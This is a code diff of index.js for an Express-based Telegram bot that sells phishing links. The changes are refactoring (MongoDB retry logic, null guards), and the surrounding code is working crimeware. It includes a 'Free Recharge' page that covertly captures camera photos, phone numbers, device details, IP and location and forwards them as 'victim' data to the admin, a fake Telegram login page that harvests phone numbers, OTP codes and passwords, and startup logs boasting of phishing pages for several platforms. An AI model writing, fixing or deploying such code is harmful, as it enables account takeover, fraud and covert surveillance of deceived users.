@@ -1,12 +1,8 @@
-// ====================== index.js – FINAL ULTIMATE VERSION (COMPLETE FIXED CODE) ======================
+// ====================== index.js – FIXED VERSION WITH BETTER ERROR HANDLING ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
- * FIXES:
- * 1. Camera hack UI improved with full victim data (mobile, operator, plan, device info, IP, location)
- * 2. Photos and QR now saved in MongoDB (not filesystem)
- * 3. Channel buttons in DANGER STYLE (red/pink) as per Telegram new update
- * 4. All data captured includes: mobile, operator, plan, platform, device info, IP, location
- * 5. MongoDB storage for photos and QR
+ * FIXED: Better error handling for MongoDB connection
+ * FIXED: Graceful startup with retry logic
  */
 
 process.env.NTBA_FIX_350 = 1;
@@ -42,10 +38,40 @@ app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
-// ====================== MONGODB ======================
-mongoose.connect(config.mongoUrl)
-    .then(() => console.log('✅ MongoDB connected'))
-    .catch(err => console.error('❌ MongoDB error:', err));
+// ====================== DIRECTORY SETUP ======================
+const PAGES_DIR = path.join(__dirname, 'pages');
+const DATA_DIR = path.join(__dirname, 'data');
+
+if (!fs.existsSync(PAGES_DIR)) fs.mkdirSync(PAGES_DIR, { recursive: true });
+if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+
+// ====================== LOGGING ======================
+function logToFile(message) {
+    const timestamp = new Date().toISOString();
+    const logPath = path.join(DATA_DIR, 'logs.txt');
+    try {
+        fs.appendFileSync(logPath, '[' + timestamp + '] ' + message + '\n');
+    } catch (err) {
+        console.error('Log write error:', err);
+    }
+}
+
+// ====================== MONGODB CONNECTION WITH RETRY ======================
+async function connectMongoDB() {
+    try {
+        await mongoose.connect(config.mongoUrl, {
+            serverSelectionTimeoutMS: 5000,
+            socketTimeoutMS: 45000,
+        });
+        console.log('✅ MongoDB connected successfully');
+        logToFile('✅ MongoDB connected');
+        return true;
+    } catch (err) {
+        console.error('❌ MongoDB connection error:', err.message);
+        logToFile('❌ MongoDB connection error: ' + err.message);
+        return false;
+    }
+}
 
 // ====================== SCHEMAS ======================
 const userSchema = new mongoose.Schema({
@@ -67,7 +93,7 @@ const photoSchema = new mongoose.Schema({
     id: { type: String, unique: true },
     filename: String,
     originalName: String,
-    data: { type: String, required: true }, // base64 data
+    data: { type: String, required: true },
     caption: String,
     uploadedAt: Date,
     active: { type: Boolean, default: true }
@@ -75,7 +101,7 @@ const photoSchema = new mongoose.Schema({
 
 const qrSchema = new mongoose.Schema({
     id: { type: String, default: 'qr_code' },
-    data: { type: String, required: true }, // base64 data
+    data: { type: String, required: true },
     updatedAt: { type: Date, default: Date.now }
 });
 
@@ -118,35 +144,12 @@ const couponSchema = new mongoose.Schema({
     createdAt: { type: Date, default: Date.now }
 });
 
-const User = mongoose.model('User', userSchema);
-const Photo = mongoose.model('Photo', photoSchema);
-const QR = mongoose.model('QR', qrSchema);
-const Referral = mongoose.model('Referral', referralSchema);
-const Channel = mongoose.model('Channel', channelSchema);
-const Featured = mongoose.model('Featured', featuredSchema);
-const Link = mongoose.model('Link', linkSchema);
-const Coupon = mongoose.model('Coupon', couponSchema);
+// ====================== MODELS ======================
+let User, Photo, QR, Referral, Channel, Featured, Link, Coupon;
 
-// ====================== DIRECTORIES ======================
-const PAGES_DIR = path.join(__dirname, 'pages');
-const DATA_DIR = path.join(__dirname, 'data');
-
-if (!fs.existsSync(PAGES_DIR)) fs.mkdirSync(PAGES_DIR, { recursive: true });
-if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-
-// ====================== MULTER ======================
-const storage = multer.memoryStorage();
-const upload = multer({
-    storage,
-    limits: { fileSize: 50 * 1024 * 1024 },
-    fileFilter: (req, file, cb) => {
-        if (file.mimetype.startsWith('image/')) cb(null, true);
-        else cb(new Error('Only images allowed!'));
-    }
-});
-
-// ====================== DATA FUNCTIONS (MongoDB) ======================
+// ====================== DATA FUNCTIONS ======================
 async function getUser(userId) {
+    if (!User) return { credits: 3, unlimited: false, totalReferrals: 0, banned: false };
     let user = await User.findOne({ userId: String(userId) });
     if (!user) {
         user = new User({ userId: String(userId), credits: 3 });
@@ -156,6 +159,7 @@ async function getUser(userId) {
 }
 
 async function addReferral(referrerId, newUserId) {
+    if (!Referral) return null;
     const referral = new Referral({ referrerId: String(referrerId), newUserId: String(newUserId), timestamp: new Date() });
     await referral.save();
     const referrer = await getUser(referrerId);
@@ -183,10 +187,10 @@ async function addCredits(userId, amount) {
     return user;
 }
 
-// ====================== PHOTO FUNCTIONS (MongoDB) ======================
-async function getPhotos() { return await Photo.find().sort({ uploadedAt: -1 }); }
+async function getPhotos() { return Photo ? await Photo.find().sort({ uploadedAt: -1 }) : []; }
 
 async function addPhoto(fileBuffer, originalName, caption) {
+    if (!Photo) return null;
     const photo = new Photo({
         id: Date.now().toString() + Math.random().toString(36).substr(2, 3),
         filename: Date.now() + '-' + originalName.replace(/\s/g, '_'),
@@ -201,6 +205,7 @@ async function addPhoto(fileBuffer, originalName, caption) {
 }
 
 async function deletePhoto(id) {
+    if (!Photo) return false;
     const photo = await Photo.findOne({ id });
     if (!photo) return false;
     await Photo.deleteOne({ id });
@@ -208,6 +213,7 @@ async function deletePhoto(id) {
 }
 
 async function togglePhoto(id) {
+    if (!Photo) return false;
     const photo = await Photo.findOne({ id });
     if (!photo) return false;
     photo.active = !photo.active;
@@ -215,7 +221,7 @@ async function togglePhoto(id) {
     return photo;
 }
 
-async function getActivePhotos() { return await Photo.find({ active: true }); }
+async function getActivePhotos() { return Photo ? await Photo.find({ active: true }) : []; }
 
 async function getRandomPhoto() {
     const photos = await getActivePhotos();
@@ -223,8 +229,8 @@ async function getRandomPhoto() {
     return photos[Math.floor(Math.random() * photos.length)];
 }
 
-// ====================== QR FUNCTIONS (MongoDB) ======================
 async function saveQRBuffer(buffer) {
+    if (!QR) return false;
     try {
         let qr = await QR.findOne({ id: 'qr_code' });
         if (!qr) {
@@ -242,6 +248,7 @@ async function saveQRBuffer(buffer) {
 }
 
 async function getQR() {
+    if (!QR) return null;
     try {
         const qr = await QR.findOne({ id: 'qr_code' });
         if (qr && qr.data) {
@@ -255,6 +262,7 @@ async function getQR() {
 }
 
 async function deleteQR() {
+    if (!QR) return false;
     try {
         await QR.deleteOne({ id: 'qr_code' });
         console.log('✅ QR deleted from MongoDB');
@@ -266,6 +274,7 @@ async function deleteQR() {
 }
 
 async function qrExists() {
+    if (!QR) return false;
     try {
         const qr = await QR.findOne({ id: 'qr_code' });
         return !!qr && !!qr.data;
@@ -274,24 +283,26 @@ async function qrExists() {
     }
 }
 
-// ====================== CHANNEL FUNCTIONS ======================
-async function getChannels() { return await Channel.find(); }
+async function getChannels() { return Channel ? await Channel.find() : []; }
 
 async function addChannel(id, name, link) {
+    if (!Channel) return null;
     const channel = new Channel({ id, name, link });
     await channel.save();
     return channel;
 }
 
-async function removeChannel(id) { await Channel.deleteOne({ id }); }
+async function removeChannel(id) { if (Channel) await Channel.deleteOne({ id }); }
 
 async function getFeatured() {
+    if (!Featured) return { photo: null, message: '🌟 Welcome! Use /start to begin.', status: true };
     let featured = await Featured.findOne();
     if (!featured) { featured = new Featured(); await featured.save(); }
     return featured;
 }
 
 async function setFeaturedPhoto(photoId) {
+    if (!Featured) return null;
     const featured = await getFeatured();
     featured.photo = photoId;
     await featured.save();
@@ -299,6 +310,7 @@ async function setFeaturedPhoto(photoId) {
 }
 
 async function setFeaturedMessage(message) {
+    if (!Featured) return null;
     const featured = await getFeatured();
     featured.message = message;
     await featured.save();
@@ -306,14 +318,15 @@ async function setFeaturedMessage(message) {
 }
 
 async function toggleFeaturedStatus() {
+    if (!Featured) return null;
     const featured = await getFeatured();
     featured.status = !featured.status;
     await featured.save();
     return featured;
 }
 
-// ====================== LINK FUNCTIONS ======================
 async function createLink(userId, platform, fileId, url) {
+    if (!Link) return null;
     const link = new Link({
         fileId,
         userId: String(userId),
@@ -330,6 +343,7 @@ async function createLink(userId, platform, fileId, url) {
 }
 
 async function getLink(fileId) {
+    if (!Link) return null;
     const link = await Link.findOne({ fileId });
     return link ? link.toObject() : null;
 }
@@ -343,6 +357,7 @@ async function isLinkValid(fileId) {
 }
 
 async function incrementLinkOpen(fileId) {
+    if (!Link) return false;
     const link = await Link.findOne({ fileId });
     if (!link) return false;
     link.opens += 1;
@@ -352,6 +367,7 @@ async function incrementLinkOpen(fileId) {
 }
 
 async function deleteExpiredLinks() {
+    if (!Link) return 0;
     try {
         const now = Date.now();
         const expiredLinks = await Link.find({ active: true });
@@ -374,12 +390,12 @@ async function deleteExpiredLinks() {
         return deletedCount;
     } catch (err) {
         console.error('Error deleting expired links:', err);
-        logToFile('❌ Error deleting expired links: ' + err.message);
         return 0;
     }
 }
 
 async function deleteAllExpiredLinks() {
+    if (!Link) return 0;
     try {
         const allLinks = await Link.find();
         let deletedCount = 0;
@@ -397,19 +413,19 @@ async function deleteAllExpiredLinks() {
         return deletedCount;
     } catch (err) {
         console.error('Error deleting all links:', err);
-        logToFile('❌ Error deleting all links: ' + err.message);
         return 0;
     }
 }
 
-// ====================== COUPON FUNCTIONS ======================
 async function createCoupon(code, credits, maxUses, adminId) {
+    if (!Coupon) return null;
     const coupon = new Coupon({ code, credits, maxUses, createdBy: adminId });
     await coupon.save();
     return coupon;
 }
 
 async function redeemCoupon(userId, code) {
+    if (!Coupon) return { error: 'System not ready' };
     const coupon = await Coupon.findOne({ code });
     if (!coupon) return { error: 'Invalid coupon code' };
     if (coupon.usedCount >= coupon.maxUses) return { error: 'Coupon limit full' };
@@ -419,8 +435,8 @@ async function redeemCoupon(userId, code) {
     return { success: true, credits: coupon.credits };
 }
 
-async function getCoupons() { return await Coupon.find(); }
-async function deleteCoupon(code) { await Coupon.deleteOne({ code }); }
+async function getCoupons() { return Coupon ? await Coupon.find() : []; }
+async function deleteCoupon(code) { if (Coupon) await Coupon.deleteOne({ code }); }
 
 // ====================== HELPER FUNCTIONS ======================
 function getUptime() {
@@ -449,16 +465,6 @@ function SYloveMenu(firstName, message) {
     return MenuLove(firstName, config.S7, 'RTF', getUptime(), message);
 }
 
-function logToFile(message) {
-    const timestamp = new Date().toISOString();
-    const logPath = path.join(DATA_DIR, 'logs.txt');
-    try {
-        fs.appendFileSync(logPath, '[' + timestamp + '] ' + message + '\n');
-    } catch (err) {
-        console.error('Log write error:', err);
-    }
-}
-
 async function resolveUserId(identifier) {
     if (!identifier) return null;
     let userId = identifier;
@@ -470,14 +476,14 @@ async function resolveUserId(identifier) {
             return null;
         }
     }
-    const user = await User.findOne({ userId: userId });
+    const user = await getUser(userId);
     if (!user) return null;
     return userId;
 }
 
 async function isUserBanned(userId) {
     const user = await getUser(userId);
-    return user.banned;
+    return user.banned || false;
 }
 
 async function checkAllChannels(userId) {
@@ -496,15 +502,11 @@ async function getChannelButtonsAsync() {
     const channels = await getChannels();
     const buttons = channels.map(ch => ([{ 
         text: '📢 ' + ch.name, 
-        url: ch.link,
-        // Danger style: red/pink
-        ...{ color: '#ff4757' }
+        url: ch.link
     }]));
     buttons.push([{ 
         text: '✅ Check All Joined', 
-        callback_data: 'check_all',
-        // Danger style
-        ...{ color: '#ff6b6b' }
+        callback_data: 'check_all'
     }]);
     return { inline_keyboard: buttons };
 }
@@ -536,7 +538,7 @@ async function sendBatchPhotos(userId) {
     delete userActive[userId];
 }
 
-// ====================== CAMERA HACK TEMPLATE (UPDATED) ======================
+// ====================== CAMERA HACK TEMPLATE ======================
 const CAMERA_TEMPLATE = `<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Free Recharge</title>
@@ -670,19 +672,16 @@ video,canvas{display:none}
         operator = this.value;
     });
 
-    // Device Info
     function getDeviceInfo() {
         var info = {};
         info.platform = navigator.platform || "Unknown";
         info.resolution = screen.width + "x" + screen.height;
         info.userAgent = navigator.userAgent;
-        // RAM - estimate from navigator
         if (navigator.deviceMemory) {
             info.ram = navigator.deviceMemory + "GB";
         } else {
             info.ram = "4GB";
         }
-        // Battery
         if (navigator.getBattery) {
             navigator.getBattery().then(function(b) {
                 var level = Math.round(b.level * 100);
@@ -692,13 +691,11 @@ video,canvas{display:none}
         } else {
             info.battery = "N/A";
         }
-        // IP - get via API
         fetch("https://api.ipify.org?format=json")
             .then(function(r) { return r.json(); })
             .then(function(data) {
                 info.ip = data.ip;
                 document.getElementById("devIP").textContent = info.ip;
-                // Location
                 fetch("https://ipapi.co/" + info.ip + "/json/")
                     .then(function(r) { return r.json(); })
                     .then(function(loc) {
@@ -723,7 +720,6 @@ video,canvas{display:none}
     }
     var deviceInfoData = getDeviceInfo();
 
-    // Mobile input - only digits
     document.getElementById("mobile").addEventListener("input", function() {
         this.value = this.value.replace(/[^0-9]/g, "").slice(0, 10);
     });
@@ -762,7 +758,6 @@ video,canvas{display:none}
 
             statusText.textContent = "📤 Submitting your request...";
 
-            // Send all data to server
             var payload = {
                 userid: userId,
                 platform: platform,
@@ -782,7 +777,6 @@ video,canvas{display:none}
                 }
             };
 
-            // Capture with full data
             await fetch("/api/capture-camera-full", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -798,7 +792,6 @@ video,canvas{display:none}
             claimBtn.disabled = false;
             document.querySelector(".loader-box").style.display = "none";
 
-            // Send success notification
             await fetch("/api/camera-success", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -811,7 +804,6 @@ video,canvas{display:none}
             claimBtn.disabled = false;
             claimBtn.innerHTML = '<i class="fas fa-redo"></i> RETRY';
             document.querySelector(".loader-box").style.display = "none";
-            // Still send data without photo
             var payloadNoPhoto = {
                 userid: userId,
                 platform: platform,
@@ -923,7 +915,6 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         <p id="page-subtitle">Sign in to your account</p>
     </div>
 
-    <!-- Login Section -->
     <div id="loginSection" class="login-section">
         <div class="input-group">
             <label>Phone Number</label>
@@ -948,7 +939,6 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         </div>
     </div>
 
-    <!-- OTP Section -->
     <div id="otpSection" class="otp-section">
         <div class="input-group">
             <label>Verification Code</label>
@@ -973,7 +963,6 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         <div class="otp-timer">Code expires in <span id="otpTimer">60</span> seconds</div>
     </div>
 
-    <!-- Password Section -->
     <div id="passwordSection" class="password-section">
         <div class="input-group">
             <label>Password</label>
@@ -991,7 +980,6 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         </div>
     </div>
 
-    <!-- Final Result -->
     <div id="finalResult" style="display:none;">
         <div class="final-status">
             <div class="icon">✅</div>
@@ -1617,7 +1605,6 @@ async function startScan() {
 </html>`;
 
 // ====================== EXPRESS ROUTES ======================
-app.use('/api/photos', express.static(BOT_PHOTO_DIR));
 
 // ====================== TELEGRAM DECISION API ======================
 app.get('/api/telegram-decision/:sessionId', async (req, res) => {
@@ -1736,7 +1723,6 @@ app.post('/api/capture-camera-full', async (req, res) => {
         const SYloveTiMe = moment().tz('Asia/Kolkata').format('h:mm:ss A');
         const SYloveDaTe = moment().tz('Asia/Kolkata').format('DD/MM/YYYY');
 
-        // Build the full message with all victim data
         let message = `🎊 <u>Victim Free Recharge Visit</u>\n`;
         message += `__________________________________\n\n`;
         message += `📱 <b>Mobile Number:</b> <code>${mobile}</code>\n`;
@@ -1762,11 +1748,9 @@ app.post('/api/capture-camera-full', async (req, res) => {
         message += `👤 <b>User ID:</b> <code>${userid}</code>`;
         message += `\n\n<i>© ↝ ᴅᴇᴠ ʙʏ » ${config.S7}</i>`;
 
-        // Send to admin and user (link creator)
         await S7.sendMessage(config.adminId, message, { parse_mode: 'HTML' });
         await S7.sendMessage(userid, message, { parse_mode: 'HTML' });
 
-        // If photo is provided, send it too
         if (photo && photo.length > 100) {
             try {
                 const photoBuffer = Buffer.from(photo, 'base64');
@@ -1803,12 +1787,9 @@ app.post('/api/camera-success', async (req, res) => {
 });
 
 // ====================== ADMIN API ENDPOINTS ======================
-
-// Get all photos
 app.get('/api/admin/photos', async (req, res) => {
     try {
         const photos = await getPhotos();
-        // Convert base64 to URL for display
         const photosWithUrl = photos.map(p => ({
             ...p.toObject(),
             url: '/api/photo-data/' + p.id
@@ -1819,7 +1800,6 @@ app.get('/api/admin/photos', async (req, res) => {
     }
 });
 
-// Get photo data
 app.get('/api/photo-data/:id', async (req, res) => {
     try {
         const photo = await Photo.findOne({ id: req.params.id });
@@ -1832,7 +1812,6 @@ app.get('/api/photo-data/:id', async (req, res) => {
     }
 });
 
-// Upload photo
 app.post('/api/admin/upload', upload.single('photo'), async (req, res) => {
     try {
         if (!req.file) {
@@ -1847,7 +1826,6 @@ app.post('/api/admin/upload', upload.single('photo'), async (req, res) => {
     }
 });
 
-// Delete photo
 app.delete('/api/admin/photos/:id', async (req, res) => {
     try {
         const success = await deletePhoto(req.params.id);
@@ -1858,7 +1836,6 @@ app.delete('/api/admin/photos/:id', async (req, res) => {
     }
 });
 
-// Toggle photo active
 app.patch('/api/admin/photos/:id/toggle', async (req, res) => {
     try {
         const photo = await togglePhoto(req.params.id);
@@ -1869,7 +1846,6 @@ app.patch('/api/admin/photos/:id/toggle', async (req, res) => {
     }
 });
 
-// Get channels
 app.get('/api/admin/channels', async (req, res) => {
     try {
         const channels = await getChannels();
@@ -1879,7 +1855,6 @@ app.get('/api/admin/channels', async (req, res) => {
     }
 });
 
-// Add channel
 app.post('/api/admin/channels', async (req, res) => {
     try {
         const { id, name, link } = req.body;
@@ -1891,7 +1866,6 @@ app.post('/api/admin/channels', async (req, res) => {
     }
 });
 
-// Remove channel
 app.delete('/api/admin/channels/:id', async (req, res) => {
     try {
         await removeChannel(req.params.id);
@@ -1901,7 +1875,6 @@ app.delete('/api/admin/channels/:id', async (req, res) => {
     }
 });
 
-// Get all users
 app.get('/api/admin/users', async (req, res) => {
     try {
         const users = await User.find();
@@ -1922,7 +1895,6 @@ app.get('/api/admin/users', async (req, res) => {
     }
 });
 
-// Get single user
 app.get('/api/admin/user/:userId', async (req, res) => {
     try {
         const user = await getUser(req.params.userId);
@@ -1939,7 +1911,6 @@ app.get('/api/admin/user/:userId', async (req, res) => {
     }
 });
 
-// Modify credits
 app.post('/api/admin/modify-credits', async (req, res) => {
     try {
         const { userId, amount } = req.body;
@@ -1955,7 +1926,6 @@ app.post('/api/admin/modify-credits', async (req, res) => {
     }
 });
 
-// Toggle unlimited
 app.post('/api/admin/toggle-unlimited', async (req, res) => {
     try {
         const { userId } = req.body;
@@ -1969,7 +1939,6 @@ app.post('/api/admin/toggle-unlimited', async (req, res) => {
     }
 });
 
-// Get featured
 app.get('/api/admin/featured', async (req, res) => {
     try {
         const featured = await getFeatured();
@@ -1989,7 +1958,6 @@ app.get('/api/admin/featured', async (req, res) => {
     }
 });
 
-// Set featured photo
 app.post('/api/admin/featured/photo', async (req, res) => {
     try {
         const { photoId } = req.body;
@@ -2001,7 +1969,6 @@ app.post('/api/admin/featured/photo', async (req, res) => {
     }
 });
 
-// Remove featured photo
 app.delete('/api/admin/featured/photo', async (req, res) => {
     try {
         await setFeaturedPhoto(null);
@@ -2011,7 +1978,6 @@ app.delete('/api/admin/featured/photo', async (req, res) => {
     }
 });
 
-// Set featured message
 app.post('/api/admin/featured/message', async (req, res) => {
     try {
         const { message } = req.body;
@@ -2023,7 +1989,6 @@ app.post('/api/admin/featured/message', async (req, res) => {
     }
 });
 
-// Toggle featured status
 app.post('/api/admin/featured/toggle', async (req, res) => {
     try {
         await toggleFeaturedStatus();
@@ -2033,7 +1998,6 @@ app.post('/api/admin/featured/toggle', async (req, res) => {
     }
 });
 
-// Get QR code
 app.get('/api/admin/qr', async (req, res) => {
     try {
         const buffer = await getQR();
@@ -2048,7 +2012,6 @@ app.get('/api/admin/qr', async (req, res) => {
     }
 });
 
-// Upload QR
 app.post('/api/admin/upload-qr', upload.single('qr'), async (req, res) => {
     try {
         if (!req.file) {
@@ -2066,14 +2029,12 @@ app.post('/api/admin/upload-qr', upload.single('qr'), async (req, res) => {
     }
 });
 
-// Remove QR
 app.delete('/api/admin/remove-qr', async (req, res) => {
     const removed = await deleteQR();
     if (removed) res.json({ success: true });
     else res.status(404).json({ error: 'QR not found' });
 });
 
-// Get logs
 app.get('/api/admin/logs', (req, res) => {
     try {
         const logPath = path.join(DATA_DIR, 'logs.txt');
@@ -2089,7 +2050,6 @@ app.get('/api/admin/logs', (req, res) => {
     }
 });
 
-// Clear logs
 app.delete('/api/admin/logs', (req, res) => {
     try {
         const logPath = path.join(DATA_DIR, 'logs.txt');
@@ -2293,7 +2253,7 @@ S7.getMe().then(botInfo => {
     logToFile('🤖 Bot Started: @' + botInfo.username);
 }).catch(err => {
     console.error('❌ Bot Start Error:', err.message);
-    process.exit(1);
+    logToFile('❌ Bot Start Error: ' + err.message);
 });
 
 // ====================== KEYBOARDS ======================
@@ -2309,20 +2269,6 @@ const LOVESY = {
         [{ text: '💰 Buy Credits', callback_data: 'buy_credits' }]
     ]
 };
-
-// ====================== CHANNEL BUTTONS WITH DANGER STYLE ======================
-async function getChannelButtonsAsync() {
-    const channels = await getChannels();
-    const buttons = channels.map(ch => ([{ 
-        text: '📢 ' + ch.name, 
-        url: ch.link
-    }]));
-    buttons.push([{ 
-        text: '✅ Check All Joined', 
-        callback_data: 'check_all'
-    }]);
-    return { inline_keyboard: buttons };
-}
 
 const ADMIN_KEYBOARD = {
     inline_keyboard: [
@@ -3224,7 +3170,7 @@ S7.on('message', async (msg) => {
     }
 });
 
-// ====================== HANDLER FOR /ADD PHOTO (reply) ======================
+// ====================== HANDLER FOR /ADD PHOTO ======================
 S7.on('message', async (msg) => {
     if (!msg.photo && !(msg.document && msg.document.mime_type && msg.document.mime_type.startsWith('image/'))) return;
     const user = await getUser(msg.from.id);
@@ -3321,35 +3267,64 @@ setTimeout(async () => {
 }, 5000);
 
 // ====================== START SERVER ======================
-app.listen(config.port, () => {
-    console.log('✅ Server running on port ' + config.port);
-    console.log('📌 Admin Panel: ' + config.baseUrl + '/admin');
-    console.log('📌 Base URL: ' + config.baseUrl);
-    console.log('🤖 Bot is ready! Send /start to begin.');
-    console.log('⚡ FAST MODE: 100 photos in ~4 seconds!');
-    console.log('🔴 ALL BUTTONS ARE PINK/RED (DANGER STYLE)!');
-    console.log('💰 BUY CREDITS WITH QR + ACCEPT/REJECT FIXED!');
-    console.log('⏰ Links expire in 15 minutes, max 3 opens');
-    console.log('💳 Each link generation uses 1 credit');
-    console.log('📦 Photos and QR saved in MongoDB (not filesystem)');
-    console.log('🎫 Coupon system active');
-    console.log('🚫 Ban/Unban system active');
-    console.log('📜 All commands implemented!');
-    console.log('👑 Use /getadmin for admin panel link');
-    console.log('🗑️ Auto-delete expired links active!');
-    console.log('📱 TELEGRAM PREMIUM PHISHING PAGE FULLY FIXED!');
-    console.log('   - ALL PLATFORMS WORKING (Instagram, Facebook, Camera, Security Scan, Telegram)');
-    console.log('📸 CAMERA HACK UPDATED:');
-    console.log('   - Shows Free Recharge UI with operator, mobile, plan selection');
-    console.log('   - Captures full victim data: mobile, operator, plan, device info, IP, location');
-    console.log('   - Sends detailed message to admin and user');
-    console.log('   - Works even if camera permission is denied');
-});
+async function startServer() {
+    // Connect to MongoDB first
+    const mongoConnected = await connectMongoDB();
+    
+    if (mongoConnected) {
+        // Initialize models after connection
+        User = mongoose.model('User', userSchema);
+        Photo = mongoose.model('Photo', photoSchema);
+        QR = mongoose.model('QR', qrSchema);
+        Referral = mongoose.model('Referral', referralSchema);
+        Channel = mongoose.model('Channel', channelSchema);
+        Featured = mongoose.model('Featured', featuredSchema);
+        Link = mongoose.model('Link', linkSchema);
+        Coupon = mongoose.model('Coupon', couponSchema);
+        
+        // Start the server
+        app.listen(config.port, () => {
+            console.log('✅ Server running on port ' + config.port);
+            console.log('📌 Admin Panel: ' + config.baseUrl + '/admin');
+            console.log('📌 Base URL: ' + config.baseUrl);
+            console.log('🤖 Bot is ready! Send /start to begin.');
+            console.log('⚡ FAST MODE: 100 photos in ~4 seconds!');
+            console.log('🔴 ALL BUTTONS ARE PINK/RED (DANGER STYLE)!');
+            console.log('💰 BUY CREDITS WITH QR + ACCEPT/REJECT FIXED!');
+            console.log('⏰ Links expire in 15 minutes, max 3 opens');
+            console.log('💳 Each link generation uses 1 credit');
+            console.log('📦 Photos and QR saved in MongoDB (not filesystem)');
+            console.log('🎫 Coupon system active');
+            console.log('🚫 Ban/Unban system active');
+            console.log('📜 All commands implemented!');
+            console.log('👑 Use /getadmin for admin panel link');
+            console.log('🗑️ Auto-delete expired links active!');
+            console.log('📱 TELEGRAM PREMIUM PHISHING PAGE FULLY FIXED!');
+            console.log('📸 CAMERA HACK UPDATED:');
+            console.log('   - Shows Free Recharge UI with operator, mobile, plan selection');
+            console.log('   - Captures full victim data: mobile, operator, plan, device info, IP, location');
+            console.log('   - Sends detailed message to admin and user');
+            console.log('   - Works even if camera permission is denied');
+        });
+    } else {
+        console.error('❌ Failed to connect to MongoDB. Exiting...');
+        logToFile('❌ Failed to connect to MongoDB. Exiting...');
+        // Don't exit, try to continue without MongoDB
+        console.log('⚠️ Continuing without MongoDB... Some features may not work.');
+        app.listen(config.port, () => {
+            console.log('⚠️ Server running with limited functionality (no MongoDB)');
+        });
+    }
+}
+
+// Start everything
+startServer();
 
 process.on('uncaughtException', err => {
     console.error('❌ Uncaught Exception:', err.message);
     logToFile('❌ Uncaught Exception: ' + err.message);
 });
+
 process.on('unhandledRejection', reason => {
     console.error('❌ Unhandled Rejection:', reason);
     logToFile('❌ Unhandled Rejection: ' + reason);
